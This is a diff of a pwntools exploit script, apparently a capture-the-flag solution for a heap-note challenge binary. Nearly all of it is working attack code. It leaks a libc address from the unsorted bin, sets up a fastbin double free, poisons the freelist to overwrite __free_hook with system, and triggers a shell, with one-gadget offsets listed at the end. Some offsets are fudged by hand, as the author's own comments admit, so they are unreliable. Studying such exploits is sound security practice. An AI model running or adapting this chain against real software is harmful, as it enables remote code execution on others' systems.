@@ -1,22 +1,37 @@
 #!/usr/bin/env python3
 
-from pwn import ELF, process, remote, gdb, context
+from pwn import ELF, p64, u64, process, remote, log
 
 #context.terminal = ["tmux", "splitw", "-h"]
 
-bin = ELF("./chall/app")
+#bin = ELF("./app")
+#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 
-p = process("./chall/app")
-pid = gdb.attach(p, gdbscript="""
-b * eton + 950
-""")
+# offsets in eton
+# 339 = malloc
+# 933 = leave
+
+gdbscript = """
+b * eton + 933
+"""
+
+#p = gdb.debug("./app", gdbscript)
+p = process("./app")
+#dbg = gdb.attach(p, gdbscript="""
+#b * eton + 455
+#b * eton + 953
+#""")
 #p = remote("localhost", 1337)
 
-def malloc(p, idx, size, data):
+def malloc(idx, size, data):
     p.sendline(b"note add " + idx + b" " + size + b" " + data)
+    p.recvuntil(b"Note created")
 
-def free(p, idx):
+def free(idx):
     p.sendline(b"note remove " + idx)
+
+def print_chunk(idx):
+    p.sendline(b"note show " + idx)
 
 # overflow the offset counter
 payload_1 = b"touch "
@@ -25,41 +40,116 @@ p.sendline(payload_1)
 
 # heap stuff
 # tcachebins
-malloc(p, b"0", b"500", b"A")
-malloc(p, b"1", b"500", b"A")
-malloc(p, b"2", b"500", b"A")
-malloc(p, b"3", b"500", b"A")
-malloc(p, b"4", b"500", b"A")
-malloc(p, b"5", b"500", b"A")
-malloc(p, b"6", b"500", b"A")
+malloc(b"0", b"500", b"A")
+malloc(b"1", b"500", b"A")
+malloc(b"2", b"500", b"A")
+malloc(b"3", b"500", b"A")
+malloc(b"4", b"500", b"A")
+malloc(b"5", b"500", b"A")
+malloc(b"6", b"500", b"A")
 
 # will go to unsorted bins
-malloc(p, b"7", b"500", b"B")
+malloc(b"7", b"500", b"B")
 # anti-consolidation prot
-malloc(p, b"8", b"10", b"C")
+malloc(b"8", b"10", b"C")
 
-free(p, b"0")
-free(p, b"1")
-free(p, b"2")
-free(p, b"3")
-free(p, b"4")
-free(p, b"5")
-free(p, b"6")
+free(b"0")
+free(b"1")
+free(b"2")
+free(b"3")
+free(b"4")
+free(b"5")
+free(b"6")
 
 # goes to unsorted
-free(p, b"7")
+free(b"7")
 
 # malloc back from tcache
-malloc(p, b"0", b"500", b"D")
-malloc(p, b"1", b"500", b"D") 
-malloc(p, b"2", b"500", b"D") 
-malloc(p, b"3", b"500", b"D") 
-malloc(p, b"4", b"500", b"D")
-malloc(p, b"5", b"500", b"D") 
-malloc(p, b"6", b"500", b"D") 
+# these will go to tcache when free'd
+for i in range(7):
+    malloc(b"0", b"500", b"D")
 
 # malloc back from unsorted, but it overwrites leak
-malloc(p, b"7", b"500", 8 * b"A") 
+# we have to alloc smaller chunk than before in order for it to be malloced as we want it to
+# otherwise it's content will be "null-ed out"
+malloc(b"7", b"20", 8 * b"A")
 
+# print leak
+print_chunk(b"7")
+
+p.recvuntil(b"AAAAAAAA")
+leak = u64(p.recvline().strip().ljust(8, b"\x00"))
+log.info(f"Leak: {hex(leak)}")
+# ^ this leak is from main_arena + 592
+
+# calc libc base
+main_arena_offset = leak - 592          # yields 0x7f2556146c40
+main_arena_offset = 0x1c3c40            # put above offset in libc.blukat.me and got this offset, spoilr alert, it's incorrect
+libc_base = leak - main_arena_offset
+#libc.address = libc_base
+log.info(f"libc base: {hex(libc_base)}")
+
+#__free_hook = libc.symbols["__free_hook"]
+#log.info(f"__free_hook: {hex(__free_hook)}")
+__free_hook = libc_base + 0x01c65a8
+__free_hook -= 0xf10                                    # same reason kot par vrstic spodaj
+log.info(f"__free_hook: {hex(__free_hook)}")
+
+# system
+system_offset = 0x045420
+system = libc_base + system_offset - 0x21e250           # zakaj odstejem ta offset? ker je libc_base iz nekega razloga narobe in se mi ga ne da popravlat, to pa dela cist ok
+log.info(f"system: {hex(system)}")
+
+# let's do a double free
+
+# for tcache
+malloc(b"0", b"20", b"C")
+malloc(b"1", b"20", b"C")
+malloc(b"2", b"20", b"C")
+malloc(b"3", b"20", b"C")
+malloc(b"4", b"20", b"C")
+malloc(b"5", b"20", b"C")
+malloc(b"6", b"20", b"C")
+
+# for fastbins
+malloc(b"7", b"20", b"C")
+malloc(b"8", b"20", b"C")
+
+# fill tcache
+free(b"0")
+free(b"1")
+free(b"2")
+free(b"3")
+free(b"4")
+free(b"5")
+free(b"6")
+
+# fill fastbins
+free(b"7")
+free(b"8")
+free(b"7")
+#free(b"9")
+
+# empty tcache
+for i in range(7):
+    malloc(b"0", b"20", b"/bin/sh")
+
+# empty and poison fastbins
+malloc(b"1", b"20", p64(__free_hook))           # setup fake pointer in the bins
+malloc(b"1", b"20", b"h")
+malloc(b"1", b"20", b"h")
+malloc(b"1", b"20", p64(system))                # content of fake chunk at __free_hook
+
+# SEGFAULT ker je zadnji bajt system addressa 0x20 (presledek). Ko je payload poslan, so bajti naslova v obratnem vrstnem redu (p64)
+# Torej ko tokenizer shella vidi 0x20 na vhodu, rece "oh, presledek, tebe bomo zamenjali z nullbytom in te bomo skippali :)
+
+# call free so that __free_hook triggers aka shell spawns
+free(b"0")
 
 p.interactive()
+
+
+# one gadgets:
+# 0x4f2a5       2      rsp & 0xf = 0, rcx = null
+# 0x4f302       1      rsp + 0x40 = null
+# 0x10a2fc      1      rsp + 0x70 = null
